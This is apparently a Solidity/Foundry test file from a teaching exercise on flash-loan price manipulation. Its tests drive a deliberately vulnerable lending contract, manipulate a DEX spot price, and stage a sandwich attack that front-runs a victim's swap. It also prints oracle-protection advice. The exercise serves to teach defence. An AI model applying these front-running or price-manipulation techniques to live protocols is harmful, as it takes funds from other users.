// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/03_FlashLoan.sol";

/**
 * EXERCISE 3: FLASH LOAN PRICE MANIPULATION
 *
 * Run with: forge test --match-contract FlashLoanTest -vvvv
 */
contract FlashLoanTest is Test {
    SimpleDEX public dex;
    FlashLoanProvider public flashLender;
    VulnerableLending public lending;
    FlashLoanAttacker public attacker;

    address public alice = makeAddr("alice");
    address public eve = makeAddr("eve");

    function setUp() public {
        // Create DEX with 100 ETH : 1M tokens
        dex = new SimpleDEX{value: 100 ether}();

        // Create flash loan provider with 1000 ETH
        flashLender = new FlashLoanProvider{value: 1000 ether}();

        // Create lending protocol
        lending = new VulnerableLending(address(dex));

        // Give eve some ETH
        vm.deal(eve, 10 ether);
    }

    function testSpotPriceManipulation() public {
        console.log("=== Spot Price Manipulation Demo ===\n");

        // Initial state
        uint256 priceBefore = dex.getSpotPrice();
        console.log("Initial reserves:");
        console.log("  ETH:", dex.reserveETH() / 1e18);
        console.log("  Token:", dex.reserveToken() / 1e18);
        console.log("  Price (tokens per ETH):", priceBefore / 1e18);

        // Attacker swaps large amount of ETH
        vm.deal(address(this), 50 ether);
        console.log("\n>>> Attacker swaps 50 ETH for tokens...\n");

        uint256 tokensOut = dex.swapETHForTokens{value: 50 ether}();
        console.log("Tokens received:", tokensOut / 1e18);

        // Check manipulated price
        uint256 priceAfter = dex.getSpotPrice();
        console.log("\nAfter manipulation:");
        console.log("  ETH:", dex.reserveETH() / 1e18);
        console.log("  Token:", dex.reserveToken() / 1e18);
        console.log("  Price (tokens per ETH):", priceAfter / 1e18);

        console.log("\n!!! Price changed from", priceBefore / 1e18, "to", priceAfter / 1e18);
        console.log("!!! That's a", ((priceBefore - priceAfter) * 100) / priceBefore, "% change!");

        // Verify significant price change
        assertLt(priceAfter, priceBefore / 2, "Price should drop significantly");
    }

    function testFlashLoanBasics() public {
        console.log("\n=== Flash Loan Basics ===\n");

        vm.startPrank(eve);

        // Deploy attacker contract
        attacker = new FlashLoanAttacker(
            address(flashLender),
            address(dex),
            address(lending)
        );

        console.log("Eve balance before:", eve.balance / 1e18, "ETH");
        console.log("Flash lender balance:", address(flashLender).balance / 1e18, "ETH");

        uint256 priceBefore = dex.getSpotPrice();
        console.log("DEX price before:", priceBefore / 1e18);

        // Fund attacker with gas + flash loan fee
        vm.deal(address(attacker), 1 ether);

        console.log("\n>>> Executing flash loan attack...\n");
        attacker.attack();

        uint256 priceAfter = dex.getSpotPrice();
        console.log("DEX price after:", priceAfter / 1e18);
        console.log("Flash lender balance after:", address(flashLender).balance / 1e18, "ETH");

        vm.stopPrank();

        // Price should return close to original (attacker swapped back)
        console.log("\nNote: Price returned to normal because attacker swapped back");
        console.log("In a real attack, they'd exploit the temporary price change!");
    }

    function testFlashLoanArbitrage() public {
        console.log("\n=== Flash Loan Arbitrage Example ===\n");

        // Create a second DEX with different prices (simulating an arb opportunity)
        SimpleDEX dex2 = new SimpleDEX{value: 150 ether}();  // Different ratio!

        console.log("DEX 1 price:", dex.getSpotPrice() / 1e18, "tokens/ETH");
        console.log("DEX 2 price:", dex2.getSpotPrice() / 1e18, "tokens/ETH");

        // There's an arb: buy cheap on DEX1, sell expensive on DEX2 (or vice versa)
        console.log("\nPrice difference = arbitrage opportunity!");
        console.log("Flash loan lets you exploit this with 0 capital");
    }

    function testOracleSafety() public view {
        console.log("\n=== How to Protect Against Price Manipulation ===\n");

        console.log("UNSAFE: Using spot price");
        console.log("  price = reserveB / reserveA");
        console.log("  -> Can be changed in 1 transaction!\n");

        console.log("SAFER: Time-Weighted Average Price (TWAP)");
        console.log("  - Accumulates price over time");
        console.log("  - Average over many blocks");
        console.log("  - 1-block manipulation barely affects it\n");

        console.log("SAFEST: Chainlink Oracle");
        console.log("  - Off-chain price aggregation");
        console.log("  - Multiple independent sources");
        console.log("  - Cannot be manipulated on-chain");
    }
}

/**
 * BONUS: Implement a complete sandwich attack!
 */
contract SandwichAttackTest is Test {
    SimpleDEX public dex;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        dex = new SimpleDEX{value: 100 ether}();
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 20 ether);
    }

    function testSandwichAttack() public {
        console.log("=== Sandwich Attack Demo ===\n");

        // Victim wants to swap 5 ETH for tokens
        // Victim sets 10% slippage tolerance

        uint256 expectedTokens = estimateTokensOut(5 ether);
        uint256 minTokens = (expectedTokens * 90) / 100;  // 10% slippage

        console.log("Victim wants to swap 5 ETH");
        console.log("Expected tokens:", expectedTokens / 1e18);
        console.log("Min acceptable (10% slippage):", minTokens / 1e18);

        // ATTACKER: Front-run - buy tokens first!
        console.log("\n>>> Attacker front-runs with 10 ETH buy...");
        vm.prank(attacker);
        uint256 attackerTokens = dex.swapETHForTokens{value: 10 ether}();
        console.log("Attacker bought:", attackerTokens / 1e18, "tokens");
        console.log("Price after front-run:", dex.getSpotPrice() / 1e18);

        // VICTIM: Transaction goes through at worse price
        console.log("\n>>> Victim's transaction executes...");
        vm.prank(victim);
        uint256 victimTokens = dex.swapETHForTokens{value: 5 ether}();
        console.log("Victim got:", victimTokens / 1e18, "tokens");
        console.log("Victim lost:", (expectedTokens - victimTokens) / 1e18, "tokens due to sandwich!");

        // Verify victim got worse execution
        assertLt(victimTokens, expectedTokens, "Victim got fewer tokens than expected");

        console.log("\n!!! Sandwich attack demonstrated !!!");
        console.log("Attacker bought before, drove price up, victim got worse rate");
    }

    function estimateTokensOut(uint256 ethIn) internal view returns (uint256) {
        uint256 k = dex.reserveETH() * dex.reserveToken();
        uint256 newReserveETH = dex.reserveETH() + ethIn;
        uint256 newReserveToken = k / newReserveETH;
        return dex.reserveToken() - newReserveToken;
    }
}